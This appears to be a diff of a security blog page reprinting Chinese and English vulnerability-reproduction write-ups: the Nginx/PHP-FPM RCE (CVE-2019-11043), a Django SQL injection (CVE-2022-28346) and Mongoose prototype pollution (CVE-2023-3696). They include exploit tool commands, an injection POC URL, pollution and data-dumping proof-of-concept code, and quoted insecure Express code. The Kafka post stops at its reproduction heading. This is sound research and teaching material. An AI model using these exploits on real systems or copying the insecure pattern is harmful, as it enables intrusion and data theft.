@@ -86,6 +86,764 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/25/CVE-2019-11043-Nginx/">
+                CVE-2019-11043漏洞分析与复现
+            </a>
+        </h2>
+    
+    <time>
+        Jan 25, 2024
+    </time>
+    <section class="content">
+        <h1><span id="cve-2019-11043漏洞分析与复现">CVE-2019-11043漏洞分析与复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/st66/p/14735800.html">STong66</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \n 导致 PATH_INFO 为空。而 php-fpm 在处理 PATH_INFO</p>
+<p>为空的情况下，存在逻辑缺陷。攻击者通过精心的构造和利用，可以导致远程代码执行。</p>
+<p>该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">location ~ [^/]\.<span class="title function_ invoke__">php</span>(/|$) &#123;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"> fastcgi_split_path_info ^(.+?\.php)(/.*)$;</span><br><span class="line"></span><br><span class="line"> fastcgi_param PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line"></span><br><span class="line"> fastcgi_pass   php:<span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
+</blockquote>
+<h3><span id="漏洞类型">漏洞类型</span></h3><blockquote>
+<p>远程代码执行漏洞</p>
+</blockquote>
+<h3><span id="危险等级">危险等级</span></h3><blockquote>
+<p>高危</p>
+</blockquote>
+<h3><span id="利用条件">利用条件</span></h3><blockquote>
+<p>nginx配置了fastcgi_split_path_info</p>
+</blockquote>
+<h3><span id="受影响系统">受影响系统</span></h3><blockquote>
+<p>PHP 5.6-7.x，Nginx&gt;&#x3D;0.7.31</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p>使用某个大佬的 docker 环境进行复现：</p>
+<p>PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
+</blockquote>
+<h3><span id="准备工作安装-docker-golang-环境">准备工作：安装 docker、golang 环境</span></h3><blockquote>
+<p>在kali中使用如下命令安装docker和golang：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker docker-compose</span><br><span class="line">sudo apt install golang</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/1.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/2.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/3.png" alt="image"></p>
+</blockquote>
+<h3><span id="搭建漏洞环境">搭建漏洞环境</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub/php/CVE-2019-11043 &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/4.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/5.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/6.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/7.png" alt="image"></p>
+</blockquote>
+<h3><span id="安装漏洞利用工具">安装漏洞利用工具</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/neex/phuip-fpizdam.git</span><br><span class="line"><span class="built_in">cd</span> phuip-fpizdam</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/8.png" alt="image"></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/9.png" alt="image"></p>
+</blockquote>
+<h3><span id="漏洞利用">漏洞利用</span></h3><blockquote>
+<p><strong>在phuip-fpizdam目录下执行 go run . “<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/index.php&quot;%E5%90%8E%E6%88%90%E5%8A%9F%E6%98%BE%E7%A4%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%88%90%E5%8A%9F%E3%80%82">http://127.0.0.1:8080/index.php&quot;后成功显示漏洞利用成功。</a></strong></p>
+<p><strong>在浏览器进行了如下请求，成功复现，可以执行系统命令,id可以替换为其他OS命令。</strong></p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/10.png" alt="image"></p>
+</blockquote>
+<h3><span id="漏洞分析">漏洞分析</span></h3><blockquote>
+<p>具体漏洞信息可参考：<a target="_blank" rel="noopener" href="https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a#diff-624bdd47ab6847d777e15327976a9227">https://github.com/php/php-src/commit/ab061f95ca966731b1c84cf5b7b20155c0a1c06a/#diff-624bdd47ab6847d777e15327976a9227</a></p>
+<p>有漏洞信息可知漏洞是由于path_info 的地址可控导致的，我们可以看到，当path_info 被%0a截断时，path_info 将被置为空，回到代码中我就发现问题所在了。</p>
+<p>如下漏洞代码</p>
+<p><img src="/2024/01/25/CVE-2019-11043-Nginx/11.png" alt="image"></p>
+<p>在代码的1134行我们发现了可控的 path_info 的指针env_path_info</p>
+<p>其中</p>
+<p>env_path_info 就是变量path_info 的地址，path_info 为0则plien 为0。</p>
+<p>slen 变量来自于请求后url的长度 int ptlen &#x3D; strlen(pt); int slen &#x3D; len - ptlen;</p>
+<p>由于<code>apache_was_here</code>这个变量在前面被设为了0，因此path_info的赋值语句实际上就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path_info = env_path_info ? env_path_info + pilen - slen : NULL;</span><br></pre></td></tr></table></figure>
+
+<p>env_path_info是从Fast CGI的PATH_INFO取过来的，而由于代入了<code>%0a</code>，在采取<code>fastcgi_split_path_info ^(.+?\.php)(/.*)$;</code>这样的Nginx配置项的情况下，fastcgi_split_path_info无法正确识别现</p>
+<p>在的url，因此会Path Info置空，所以env_path_info在进行取值时，同样会取到空值，这也正是漏洞原因所在。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/25/CVE-2022-28346-Django/">
+                Django SQL注入漏洞 (CVE-2022-28346)
+            </a>
+        </h2>
+    
+    <time>
+        Jan 25, 2024
+    </time>
+    <section class="content">
+        <h1><span id="django-sql注入漏洞-cve-2022-28346">Django SQL注入漏洞 (CVE-2022-28346)</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46944519/article/details/128496498">李火火安全阁</a> 并作补充</p>
+</blockquote>
+<h2><span id="一-简介">一、简介</span></h2><blockquote>
+<p>Django是用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=Python%E5%BC%80%E5%8F%91&spm=1001.2101.3001.7020">Python开发</a>的一个免费开源的Web结构，几乎包括了Web使用方方面面，能够用于快速建立高性能、文雅的网站，Diango提供了许多网站后台开发常常用到的模块，使开发者可以专注于业务部分。</p>
+</blockquote>
+<h2><span id="二-漏洞概述">二、漏洞概述</span></h2><blockquote>
+<p>漏洞编号：CVE-2022-28346</p>
+<p>攻击者使用精心编制的字典，通过 **kwargs 传递给QuerySet.annotate()、aggregate()和extra()这些方法，可导致这些方法在列别名中受到SQL注入攻击，该漏洞在 2.2.28 之前的 Django 2.2、3.2.13 之前的 3.2 和 4.0.4 之前的 4.0 中都存在这个问题。</p>
+</blockquote>
+<h2><span id="三-漏洞影响版本">三、漏洞影响版本</span></h2><blockquote>
+<ul>
+<li>4.0 &lt;&#x3D; Django &lt; 4.0.4</li>
+<li>3.2 &lt;&#x3D; Django &lt; 3.2.13</li>
+<li>2.2 &lt;&#x3D; Django &lt; 2.2.28</li>
+</ul>
+</blockquote>
+<h2><span id="四-漏洞分析">四、漏洞分析</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://cn-sec.com/archives/962127.html">http://cn-sec.com/archives/962127.html</a></p>
+</blockquote>
+<h2><span id="五-漏洞复现">五、漏洞复现</span></h2><h3><span id="docker">Docker</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull s0cke3t/cve-2022-28346:latest</span><br><span class="line">docker run -d -p 8080:8000 s0cke3t/cve-2022-28346</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="本地环境搭建">本地环境搭建</span></h3><blockquote>
+<p>环境下载：<code>https://github.com/DeEpinGh0st/CVE-2022-28346</code></p>
+<p>Python：3.9.8<br>Django：3.2.11</p>
+</blockquote>
+<h3><span id="本地启动">本地启动</span></h3><blockquote>
+<p>环境初始化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python manage.py makemigrations</span><br><span class="line">python manage.py migrate</span><br><span class="line">访问http://x.x.x.x:8000/ 插入初始化数据</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/25/CVE-2022-28346-Django/1.png" alt="image"></p>
+<p>浏览器访问</p>
+<p><img src="/2024/01/25/CVE-2022-28346-Django/2.png" alt="image"></p>
+<p>访问404可以获取到报错页面查看报错信息得到传参接口(注入点接口)</p>
+<p><img src="/2024/01/25/CVE-2022-28346-Django/3.png" alt="image"></p>
+<p>访问到demo&#x2F; 目录下，同样会出现报错信息</p>
+<p><img src="/2024/01/25/CVE-2022-28346-Django/4.png" alt="image"></p>
+<p>利用报错中提示的参数进行SQL注入<br>POC：<code>http://x.x.x.x:8000/demo?field=demo.name&quot; FROM &quot;demo_user&quot; union SELECT &quot;1&quot;,sqlite_version(),&quot;3&quot; –</code></p>
+<p><img src="/2024/01/25/CVE-2022-28346-Django/5.png" alt="image"></p>
+</blockquote>
+<h2><span id="六-修复方法">六、修复方法</span></h2><blockquote>
+<p>官方已发布安全版本<br>下载地址：<a target="_blank" rel="noopener" href="https://www.djangoproject.com/download/">https://www.djangoproject.com/download/</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Django/" rel="tag">Django</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SQL-Injection/" rel="tag">SQL Injection</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/23/CVE-2023-3696-Mongoose/">
+                Mongoose Prototype Pollution Vulnerability in automattic/mongoose(CVE-2023-3696)
+            </a>
+        </h2>
+    
+    <time>
+        Jan 23, 2024
+    </time>
+    <section class="content">
+        <h1><span id="mongoose-prototype-pollution-vulnerability-in-automatticx2fmongoosecve-2023-3696">Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose(CVE-2023-3696)</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://huntr.com/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/">ehhthing</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>If an attacker has some way to control an object on the Mongo server through one way or another, it is possible to cause prototype pollution on any Mongoose client. Notably, if a poorly implemented service allows a user to control the object in <code>findByIdAndUpdate</code> and similar functions, this bug could be triggered through the <code>$rename</code> operator. Another possibility is if two different services interact with the same Mongo database, it is possible that one of them allows a user to inject an arbitrary object containing a <code>__proto__</code> field, which would also trigger this bug.</p>
+<p>If used with Express and EJS, this bug can easily lead to RCE. Many other libraries have known prototype pollution exploits as well, which may cause significant impact.</p>
+<p>Allowing user input directly into <code>update</code> operations seems to be a very common pattern. For example, if we ask GPT-4 a basic prompt for updating a post using Mongoose, it gives us:</p>
+</blockquote>
+<h3><span id="prompt">Prompt:</span></h3><blockquote>
+<p>Using Express and Mongoose, take input from the user to find a “Post” by an id, and update its fields.</p>
+</blockquote>
+<h3><span id="response">Response:</span></h3><blockquote>
+<p>In Express and Mongoose, you can use the <code>findByIdAndUpdate</code> method to find a “Post” by an id and update its fields. Here’s how you can do it:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const mongoose = require(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line">const Post = require(<span class="string">&#x27;./models/post&#x27;</span>); // Assuming you have a Post model <span class="keyword">in</span> models/post.js</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.use(express.json()); // <span class="keyword">for</span> parsing application/json</span><br><span class="line"></span><br><span class="line">app.put(<span class="string">&#x27;/post/:id&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    const &#123; <span class="built_in">id</span> &#125; = req.params;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        const post = <span class="keyword">await</span> Post.findByIdAndUpdate(<span class="built_in">id</span>, req.body, &#123; new: true &#125;); </span><br><span class="line">        // new: true returns the updated post rather than the original post when the operation began</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!post) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.status(<span class="number">404</span>).send();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.send(post);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        res.status(<span class="number">400</span>).send(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>In the above example, <code>req.params.id</code> is used to get the id from the URL. The <code>req.body</code> is used to get the updated data from the user. The <code>&#123; new: true &#125;</code> option is used to return the updated post.</p>
+</blockquote>
+<h2><span id="proof-of-concept">Proof of concept:</span></h2><blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; connect, model, Schema &#125; <span class="keyword">from</span> <span class="string">&#x27;mongoose&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> connect(<span class="string">&#x27;mongodb://127.0.0.1:27017/exploit&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const Example = model(<span class="string">&#x27;Example&#x27;</span>, new Schema(&#123; hello: String &#125;));</span><br><span class="line"></span><br><span class="line">const example = <span class="keyword">await</span> new Example(&#123; hello: <span class="string">&#x27;world!&#x27;</span> &#125;).save();</span><br><span class="line"><span class="keyword">await</span> Example.findByIdAndUpdate(example._<span class="built_in">id</span>, &#123;</span><br><span class="line">    $rename: &#123;</span><br><span class="line">        hello: <span class="string">&#x27;__proto__.polluted&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// this <span class="keyword">is</span> what causes the pollution</span><br><span class="line"><span class="keyword">await</span> Example.find();</span><br><span class="line"></span><br><span class="line">const test = &#123;&#125;;</span><br><span class="line">console.log(test.polluted); // world!</span><br><span class="line">console.log(Object.prototype); // [Object: null prototype] &#123; polluted: <span class="string">&#x27;world!&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">process.exit();</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="resulting-database-entry">Resulting Database Entry</span></h2><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exploit&gt; db.examples.find(&#123;&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&quot;64a757117e3dbf11b14e0fd4&quot;</span>),</span><br><span class="line">    __v: 0,</span><br><span class="line">    [<span class="string">&#x27;__proto__&#x27;</span>]: &#123; polluted: <span class="string">&#x27;world!&#x27;</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="explanation">Explanation</span></h2><blockquote>
+<p>When Mongoose finds documents and reads the malicious document into an object, it uses an object with a prototype. If the top level object contains a <code>__proto__</code> field, it leads to overwrites of the object prototype.</p>
+</blockquote>
+<h3><span id="affected-code">Affected Code:</span></h3><blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document.js</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Init helper.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; self document instance</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; obj raw mongodb doc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; doc object we are initializing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; [opts] Optional Options</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Boolean</span>&#125; [opts.setters] Call `applySetters` instead of `cast`</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">String</span>&#125; [prefix] Prefix to add to each path</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@api</span> <span class="variable">private</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params">self, obj, doc, opts, prefix</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_init</span>(<span class="params">index</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!schemaType &amp;&amp; utils.<span class="title function_">isPOJO</span>(obj[i])) &#123;</span><br><span class="line">      <span class="comment">//  ...</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// (1)</span></span><br><span class="line">      <span class="comment">// our malicious payload first reaches here, where:</span></span><br><span class="line">      <span class="comment">// obj is some document</span></span><br><span class="line">      <span class="comment">// i = &#x27;__proto__&#x27;</span></span><br><span class="line">      <span class="comment">// so, obj[i] gives Object.prototype, which gets used in (2)</span></span><br><span class="line">      <span class="title function_">init</span>(self, obj[i], doc[i], opts, path + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!schemaType) &#123;</span><br><span class="line">      <span class="comment">// (2)</span></span><br><span class="line">      <span class="comment">// after the recursive call on (1), we reach here</span></span><br><span class="line">      <span class="comment">// pollution happens on the next line, where:</span></span><br><span class="line">      <span class="comment">// doc: Object.prototype,</span></span><br><span class="line">      <span class="comment">// obj = &#123; polluted: &#x27;world!&#x27; &#125;,</span></span><br><span class="line">      <span class="comment">// i = &#x27;polluted&#x27;</span></span><br><span class="line">      doc[i] = obj[i];</span><br><span class="line">      <span class="keyword">if</span> (!strict &amp;&amp; !prefix) &#123;</span><br><span class="line">        self[i] = obj[i];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="credits">Credits</span></h2><blockquote>
+<p>This bug was found by myself (<a target="_blank" rel="noopener" href="https://twitter.com/ehhthing">@ehhthing</a>) and <a target="_blank" rel="noopener" href="https://twitter.com/strellic_">@strellic_</a></p>
+</blockquote>
+<h2><span id="impact">Impact</span></h2><blockquote>
+<p>If used with Express and EJS, this bug can <a target="_blank" rel="noopener" href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce">easily lead to RCE</a>. Many other libraries have known prototype pollution exploits as well, which may cause significant impact.</p>
+<p>We also found that we can actually exploit Mongoose itself with the prototype pollution, to cause it to bypass all query parameters when using <code>.find()</code>, which allows an attacker to potentially dump entire collections:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; connect, model, Schema &#125; <span class="keyword">from</span> <span class="string">&#x27;mongoose&#x27;</span>;</span><br><span class="line"></span><br><span class="line">const mongoose = <span class="keyword">await</span> connect(<span class="string">&#x27;mongodb://127.0.0.1:27017/exploit&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const Post = model(<span class="string">&#x27;Post&#x27;</span>, new Schema(&#123;</span><br><span class="line">    owner: String,</span><br><span class="line">    message: String</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> Post.create(&#123;</span><br><span class="line">    owner: <span class="string">&quot;SECRET_USER&quot;</span>,</span><br><span class="line">    message: <span class="string">&quot;SECRET_MESSAGE&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const post = <span class="keyword">await</span> Post.create(&#123;</span><br><span class="line">    owner: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    message: <span class="string">&quot;test message&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">await</span> Post.findByIdAndUpdate(post._<span class="built_in">id</span>, &#123;</span><br><span class="line">    $rename: &#123;</span><br><span class="line">        message: <span class="string">&#x27;__proto__.owner&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// this pollutes Object.prototype.owner = <span class="string">&quot;test message&quot;</span></span><br><span class="line"><span class="keyword">await</span> Post.find(&#123; owner: <span class="string">&quot;user&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line">// now, when querying posts, even when an owner <span class="keyword">is</span> specified, <span class="built_in">all</span> posts are returned</span><br><span class="line">const posts = <span class="keyword">await</span> Post.find(&#123;</span><br><span class="line">    owner: <span class="string">&quot;user2&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(posts); // both posts created are found</span><br><span class="line">/*</span><br><span class="line">output:</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: new ObjectId(<span class="string">&quot;64a7610756da3c04f900bf49&quot;</span>),</span><br><span class="line">    owner: <span class="string">&#x27;SECRET_USER&#x27;</span>,</span><br><span class="line">    message: <span class="string">&#x27;SECRET_MESSAGE&#x27;</span>,</span><br><span class="line">    __v: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: new ObjectId(<span class="string">&quot;64a7610756da3c04f900bf4b&quot;</span>),</span><br><span class="line">    owner: <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">    __v: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line">*/</span><br><span class="line">process.exit();</span><br></pre></td></tr></table></figure>
+
+<p>This could also easily lead to denial of service depending on how large a Mongo collection is, and which other libraries are being used in the application.</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Mongoose/" rel="tag">Mongoose</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/23/CVE-2023-25194-Apache-Kafka/">
+                Apache Kafka 远程代码执行漏洞复现及攻击拦截 (CVE-2023-25194)
+            </a>
+        </h2>
+    
+    <time>
+        Jan 23, 2024
+    </time>
+    <section class="content">
+        <h1><span id="apache-kafka-远程代码执行漏洞复现及攻击拦截-cve-2023-25194">Apache Kafka 远程代码执行漏洞复现及攻击拦截 (CVE-2023-25194)</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2295788">云鲨RASP</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞简介">漏洞简介</span></h2><blockquote>
+<p>Apache Kafka是一个分布式数据流处理平台，可以实时发布、订阅、存储和处理数据流。Kafka Connect是一种用于在kafka和其他系统之间可扩展、可靠的流式传输数据的工具。攻击者可以利用基于SASLJAAS 配置和SASL 协议的任意Kafka客户端，对Kafka Connect worker 创建或修改连接器时，通过构造特殊的配置，进行JNDI 注入来实现远程代码执行。</p>
+</blockquote>
+<h2><span id="影响版本">影响版本</span></h2><blockquote>
+<p>2.4.0&lt;&#x3D;Apache kafka&lt;&#x3D;3.3.2</p>
+</blockquote>
+<h2><span id="修复方案">修复方案</span></h2><blockquote>
+<p>更新Apache Kafka至官方最新版本</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>通过<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub%E6%90%AD%E5%BB%BA">https://github.com/vulhub/vulhub搭建</a></p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
